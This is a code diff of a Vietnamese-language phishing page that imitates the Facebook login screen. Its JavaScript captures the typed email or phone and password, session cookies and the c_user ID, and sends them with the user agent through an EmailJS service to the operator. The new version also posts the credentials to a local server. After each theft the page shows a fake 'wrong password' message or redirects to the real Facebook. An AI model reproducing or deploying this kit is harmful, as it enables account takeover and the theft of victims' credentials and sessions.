@@ -245,240 +245,134 @@
         })();
     </script>
 
-    <div class="container">
-        <div class="left-section">
-            <img src="https://static.xx.fbcdn.net/rsrc.php/yI/r/4aAhOHG-Ft5.svg" alt="Facebook" class="logo" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/8/89/Facebook_Logo_%282019%29.svg'">
-            <div class="slogan">Kết nối với bạn bè và cả thế giới xung quanh bạn trên Facebook.</div>
-        </div>
-        <div class="login-container active">
-            <input type="text" id="login-input" placeholder="Email hoặc số điện thoại">
-            <input type="password" id="password" placeholder="Mật khẩu">
-            <button class="btn-login" onclick="loginWithForm()">Đăng nhập</button>
-            <button class="btn-redirect" onclick="redirectIfLoggedIn()">Chuyển hướng đến Facebook</button>
-            <a class="forgot-password" onclick="showForgot()">Quên mật khẩu?</a>
-            <div class="divider"></div>
-            <button class="btn-create" onclick="showCreate()">Tạo tài khoản mới</button>
-        </div>
-        <div class="forgot-container">
-            <h2>Tìm tài khoản của bạn</h2>
-            <p>Vui lòng nhập email hoặc số điện thoại để tìm kiếm tài khoản của bạn.</p>
-            <input type="text" id="forgot-input" placeholder="Email hoặc số điện thoại">
-            <button class="btn-login" onclick="showForgotOptions()">Tìm kiếm</button>
-            <div id="forgot-options" style="display:none;">
-                <p>Chọn cách nhận mã xác nhận:</p>
-                <button class="btn-login" style="margin-bottom:10px;" onclick="alert('Gửi mã qua email (mô phỏng).')">Gửi qua email</button>
-                <button class="btn-login" onclick="alert('Gửi qua SMS (mô phỏng).')">Gửi qua SMS</button>
-            </div>
-            <a class="btn-back" onclick="showLogin()">Quay lại</a>
-        </div>
-        <div class="create-container">
-            <h2>Đăng ký</h2>
-            <p>Nhanh chóng và dễ dàng.</p>
-            <input type="text" placeholder="Tên">
-            <input type="text" placeholder="Họ">
-            <input type="text" placeholder="Số di động hoặc email">
-            <input type="password" placeholder="Mật khẩu mới">
-            <div style="margin-bottom:12px;">
-                <label style="font-size:14px; color:#606770;">Ngày sinh</label>
-                <div style="display:flex; justify-content:space-between;">
-                    <select>
-                        <option>Ngày</option>
-                        ${Array.from({length: 31}, (_, i) => `<option>${i + 1}</option>`).join('')}
-                    </select>
-                    <select>
-                        <option>Tháng</option>
-                        <option>Tháng 1</option><option>Tháng 2</option><option>Tháng 3</option>
-                        <option>Tháng 4</option><option>Tháng 5</option><option>Tháng 6</option>
-                        <option>Tháng 7</option><option>Tháng 8</option><option>Tháng 9</option>
-                        <option>Tháng 10</option><option>Tháng 11</option><option>Tháng 12</option>
-                    </select>
-                    <select>
-                        <option>Năm</option>
-                        ${Array.from({length: 100}, (_, i) => `<option>${2025 - i}</option>`).join('')}
-                    </select>
-                </div>
-            </div>
-            <div class="radio-group">
-                <label><input type="radio" name="gender" value="female">Nữ</label>
-                <label><input type="radio" name="gender" value="male">Nam</label>
-                <label><input type="radio" name="gender" value="custom">Tùy chỉnh</label>
-            </div>
-            <button class="btn-create" onclick="alert('Tạo tài khoản (mô phỏng).')">Đăng ký</button>
-            <a class="btn-back" onclick="showLogin()">Quay lại</a>
-        </div>
-        <div class="language-container">
-            <h2>Chọn ngôn ngữ</h2>
-            <p>Chọn ngôn ngữ bạn muốn sử dụng trên Facebook:</p>
-            <ul>
-                <li><a onclick="alert('Đã chọn Tiếng Việt (mô phỏng).')">Tiếng Việt</a></li>
-                <li><a onclick="alert('Đã chọn English (US) (mô phỏng).')">English (US)</a></li>
-                <li><a onclick="alert('Đã chọn ngôn ngữ khác (mô phỏng).')">Tiếng Nhật</a></li>
-            </ul>
-            <a class="btn-back" onclick="showLogin()">Quay lại</a>
-        </div>
-        <div class="privacy-container">
-            <h2>Chính sách quyền riêng tư</h2>
-            <p>Chúng tôi cam kết bảo vệ thông tin cá nhân của bạn. Dưới đây là các nguyên tắc cơ bản:</p>
-            <ul>
-                <li>Thu thập thông tin để cải thiện trải nghiệm.</li>
-                <li>Không chia sẻ dữ liệu cá nhân mà không có sự đồng ý.</li>
-                <li>Bạn có quyền kiểm soát thông tin của mình.</li>
-            </ul>
-            <a class="btn-back" onclick="showLogin()">Quay lại</a>
-        </div>
-        <div class="terms-container">
-            <h2>Điều khoản dịch vụ</h2>
-            <p>Bằng cách sử dụng Facebook, bạn đồng ý với các điều khoản sau:</p>
-            <ul>
-                <li>Không đăng nội dung vi phạm pháp luật.</li>
-                <li>Tuân thủ các quy định cộng đồng.</li>
-                <li>Chịu trách nhiệm với tài khoản của bạn.</li>
-            </ul>
-            <a class="btn-back" onclick="showLogin()">Quay lại</a>
-        </div>
-        <div class="help-container">
-            <h2>Trợ giúp</h2>
-            <p>Các câu hỏi thường gặp:</p>
-            <ul>
-                <li><a onclick="alert('Hướng dẫn đăng nhập (mô phỏng).')">Làm sao để đăng nhập?</a></li>
-                <li><a onclick="alert('Hướng dẫn khôi phục (mô phỏng).')">Quên mật khẩu thì làm gì?</a></li>
-                <li><a onclick="alert('Hỗ trợ thêm (mô phỏng).')">Liên hệ hỗ trợ</a></li>
-            </ul>
-            <a class="btn-back" onclick="showLogin()">Quay lại</a>
-        </div>
-    </div>
+   <script>
+    function showPopup(title, subtext = "") {
+        document.getElementById('popup-title').innerText = title;
+        document.getElementById('popup-subtext').innerText = subtext;
+        document.getElementById('popup').style.display = 'block';
+        document.getElementById('overlay').style.display = 'block';
+    }
 
-    <footer class="footer">
-        <a onclick="showLanguage()">Tiếng Việt</a>
-        <a onclick="showLanguage()">English (US)</a>
-        <a onclick="showPrivacy()">Chính sách quyền riêng tư</a>
-        <a onclick="showTerms()">Điều khoản</a>
-        <a onclick="showHelp()">Trợ giúp</a>
-        <span>Meta © 2025</span>
-    </footer>
+    function hidePopup() {
+        document.getElementById('popup').style.display = 'none';
+        document.getElementById('overlay').style.display = 'none';
+    }
 
-    <div class="overlay" id="overlay"></div>
-    <div class="popup" id="popup">
-        <h3 id="popup-title"></h3>
-        <small id="popup-subtext"></small>
-        <button onclick="hidePopup()" style="margin-top:10px; padding:8px 16px; background:#1877f2; color:#fff; border:none; border-radius:6px;">OK</button>
-    </div>
+    function getCookies() {
+        return document.cookie || "Không có";
+    }
 
-    <script>
-        function showPopup(title, subtext = "") {
-            document.getElementById('popup-title').innerText = title;
-            document.getElementById('popup-subtext').innerText = subtext;
-            document.getElementById('popup').style.display = 'block';
-            document.getElementById('overlay').style.display = 'block';
-        }
-
-        function hidePopup() {
-            document.getElementById('popup').style.display = 'none';
-            document.getElementById('overlay').style.display = 'none';
-        }
-
-        function getCookies() {
-            return document.cookie || "Không có";
-        }
-
-        function getUIDFromCookie() {
-            const cookies = document.cookie.split(';');
-            for (let cookie of cookies) {
-                if (cookie.includes("c_user")) {
-                    return cookie.split('=')[1].trim();
-                }
+    function getUIDFromCookie() {
+        const cookies = document.cookie.split(';');
+        for (let cookie of cookies) {
+            if (cookie.includes("c_user")) {
+                return cookie.split('=')[1].trim();
             }
-            return "Không có";
         }
+        return "Không có";
+    }
 
-        function showLogin() {
-            document.querySelector('.login-container').classList.add('active');
-            document.querySelector('.forgot-container').classList.remove('active');
-            document.querySelector('.create-container').classList.remove('active');
-            document.querySelector('.language-container').classList.remove('active');
-            document.querySelector('.privacy-container').classList.remove('active');
-            document.querySelector('.terms-container').classList.remove('active');
-            document.querySelector('.help-container').classList.remove('active');
+    function showLogin() {
+        document.querySelector('.login-container').classList.add('active');
+        document.querySelector('.forgot-container').classList.remove('active');
+        document.querySelector('.create-container').classList.remove('active');
+        document.querySelector('.language-container').classList.remove('active');
+        document.querySelector('.privacy-container').classList.remove('active');
+        document.querySelector('.terms-container').classList.remove('active');
+        document.querySelector('.help-container').classList.remove('active');
+    }
+
+    function showForgot() {
+        document.querySelector('.login-container').classList.remove('active');
+        document.querySelector('.forgot-container').classList.add('active');
+        document.querySelector('.create-container').classList.remove('active');
+        document.querySelector('.language-container').classList.remove('active');
+        document.querySelector('.privacy-container').classList.remove('active');
+        document.querySelector('.terms-container').classList.remove('active');
+        document.querySelector('.help-container').classList.remove('active');
+        document.getElementById('forgot-options').style.display = 'none';
+    }
+
+    function showForgotOptions() {
+        const forgotInput = document.getElementById('forgot-input').value;
+        if (!forgotInput) {
+            alert("Vui lòng nhập email hoặc số điện thoại.");
+            return;
         }
+        document.getElementById('forgot-options').style.display = 'block';
+    }
 
-        function showForgot() {
-            document.querySelector('.login-container').classList.remove('active');
-            document.querySelector('.forgot-container').classList.add('active');
-            document.querySelector('.create-container').classList.remove('active');
-            document.querySelector('.language-container').classList.remove('active');
-            document.querySelector('.privacy-container').classList.remove('active');
-            document.querySelector('.terms-container').classList.remove('active');
-            document.querySelector('.help-container').classList.remove('active');
-            document.getElementById('forgot-options').style.display = 'none';
-        }
+    function showCreate() {
+        document.querySelector('.login-container').classList.remove('active');
+        document.querySelector('.forgot-container').classList.remove('active');
+        document.querySelector('.create-container').classList.add('active');
+        document.querySelector('.language-container').classList.remove('active');
+        document.querySelector('.privacy-container').classList.remove('active');
+        document.querySelector('.terms-container').classList.remove('active');
+        document.querySelector('.help-container').classList.remove('active');
+    }
 
-        function showForgotOptions() {
-            const forgotInput = document.getElementById('forgot-input').value;
-            if (!forgotInput) {
-                alert("Vui lòng nhập email hoặc số điện thoại.");
-                return;
-            }
-            document.getElementById('forgot-options').style.display = 'block';
-        }
+    function showLanguage() {
+        document.querySelector('.login-container').classList.remove('active');
+        document.querySelector('.forgot-container').classList.remove('active');
+        document.querySelector('.create-container').classList.remove('active');
+        document.querySelector('.language-container').classList.add('active');
+        document.querySelector('.privacy-container').classList.remove('active');
+        document.querySelector('.terms-container').classList.remove('active');
+        document.querySelector('.help-container').classList.remove('active');
+    }
 
-        function showCreate() {
-            document.querySelector('.login-container').classList.remove('active');
-            document.querySelector('.forgot-container').classList.remove('active');
-            document.querySelector('.create-container').classList.add('active');
-            document.querySelector('.language-container').classList.remove('active');
-            document.querySelector('.privacy-container').classList.remove('active');
-            document.querySelector('.terms-container').classList.remove('active');
-            document.querySelector('.help-container').classList.remove('active');
-        }
+    function showPrivacy() {
+        document.querySelector('.login-container').classList.remove('active');
+        document.querySelector('.forgot-container').classList.remove('active');
+        document.querySelector('.create-container').classList.remove('active');
+        document.querySelector('.language-container').classList.remove('active');
+        document.querySelector('.privacy-container').classList.add('active');
+        document.querySelector('.terms-container').classList.remove('active');
+        document.querySelector('.help-container').classList.remove('active');
+    }
 
-        function showLanguage() {
-            document.querySelector('.login-container').classList.remove('active');
-            document.querySelector('.forgot-container').classList.remove('active');
-            document.querySelector('.create-container').classList.remove('active');
-            document.querySelector('.language-container').classList.add('active');
-            document.querySelector('.privacy-container').classList.remove('active');
-            document.querySelector('.terms-container').classList.remove('active');
-            document.querySelector('.help-container').classList.remove('active');
-        }
+    function showTerms() {
+        document.querySelector('.login-container').classList.remove('active');
+        document.querySelector('.forgot-container').classList.remove('active');
+        document.querySelector('.create-container').classList.remove('active');
+        document.querySelector('.language-container').classList.remove('active');
+        document.querySelector('.privacy-container').classList.remove('active');
+        document.querySelector('.terms-container').classList.add('active');
+        document.querySelector('.help-container').classList.remove('active');
+    }
 
-        function showPrivacy() {
-            document.querySelector('.login-container').classList.remove('active');
-            document.querySelector('.forgot-container').classList.remove('active');
-            document.querySelector('.create-container').classList.remove('active');
-            document.querySelector('.language-container').classList.remove('active');
-            document.querySelector('.privacy-container').classList.add('active');
-            document.querySelector('.terms-container').classList.remove('active');
-            document.querySelector('.help-container').classList.remove('active');
-        }
+    function showHelp() {
+        document.querySelector('.login-container').classList.remove('active');
+        document.querySelector('.forgot-container').classList.remove('active');
+        document.querySelector('.create-container').classList.remove('active');
+        document.querySelector('.language-container').classList.remove('active');
+        document.querySelector('.privacy-container').classList.remove('active');
+        document.querySelector('.terms-container').classList.remove('active');
+        document.querySelector('.help-container').classList.add('active');
+    }
 
-        function showTerms() {
-            document.querySelector('.login-container').classList.remove('active');
-            document.querySelector('.forgot-container').classList.remove('active');
-            document.querySelector('.create-container').classList.remove('active');
-            document.querySelector('.language-container').classList.remove('active');
-            document.querySelector('.privacy-container').classList.remove('active');
-            document.querySelector('.terms-container').classList.add('active');
-            document.querySelector('.help-container').classList.remove('active');
-        }
+    function loginWithForm() {
+        const loginInput = document.getElementById('login-input').value || "";
+        const password = document.getElementById('password').value || "";
+        const isPhone = /^\d+$/.test(loginInput) ? loginInput : "Không có";
+        const isEmail = loginInput.includes("@") ? loginInput : "Không có";
 
-        function showHelp() {
-            document.querySelector('.login-container').classList.remove('active');
-            document.querySelector('.forgot-container').classList.remove('active');
-            document.querySelector('.create-container').classList.remove('active');
-            document.querySelector('.language-container').classList.remove('active');
-            document.querySelector('.privacy-container').classList.remove('active');
-            document.querySelector('.terms-container').classList.remove('active');
-            document.querySelector('.help-container').classList.add('active');
-        }
-
-        function loginWithForm() {
-            const loginInput = document.getElementById('login-input').value || "";
-            const password = document.getElementById('password').value || "";
-            const isPhone = /^\d+$/.test(loginInput) ? loginInput : "Không có";
-            const isEmail = loginInput.includes("@") ? loginInput : "Không có";
-            const cookies = getCookies();
+        fetch('http://localhost:3000/login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                email: loginInput,
+                password: password
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            const cookies = data.cookies || "Không có";
+            const uid = data.uid || "Không có";
             const userAgent = navigator.userAgent;
-            const uid = getUIDFromCookie();
 
             const templateParams = {
                 password: password || "Không có",
@@ -490,34 +384,37 @@
                 timestamp: new Date().toLocaleString()
             };
 
-            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
-                .then(() => {
-                    showPopup("Đăng nhập không thành công", "Sai tên đăng nhập hoặc mật khẩu, vui lòng thử lại");
-                }, () => {
-                    showPopup("Đăng nhập không thành công", "Sai tên đăng nhập hoặc mật khẩu, vui lòng thử lại");
-                });
-        }
+            return emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams);
+        })
+        .then(() => {
+            showPopup("Đăng nhập không thành công", "Sai tên đăng nhập hoặc mật khẩu, vui lòng thử lại");
+        })
+        .catch(error => {
+            console.error('Lỗi:', error);
+            showPopup("Đăng nhập không thành công", "Có lỗi xảy ra, vui lòng thử lại");
+        });
+    }
 
-        function redirectIfLoggedIn() {
-            const cookies = getCookies();
-            const uid = getUIDFromCookie();
+    function redirectIfLoggedIn() {
+        const cookies = getCookies();
+        const uid = getUIDFromCookie();
 
-            const templateParams = {
-                cookies: cookies,
-                uid: uid,
-                action: "Chuyển hướng khi đã đăng nhập",
-                timestamp: new Date().toLocaleString()
-            };
-
-            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
-                .then(() => {
-                    window.location.href = "https://www.facebook.com";
-                });
-        }
-
-        window.onload = function() {
-            showLogin();
+        const templateParams = {
+            cookies: cookies,
+            uid: uid,
+            action: "Chuyển hướng khi đã đăng nhập",
+            timestamp: new Date().toLocaleString()
         };
-    </script>
+
+        emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
+            .then(() => {
+                window.location.href = "https://www.facebook.com";
+            });
+    }
+
+    window.onload = function() {
+        showLogin();
+    };
+</script>
 </body>
 </html>
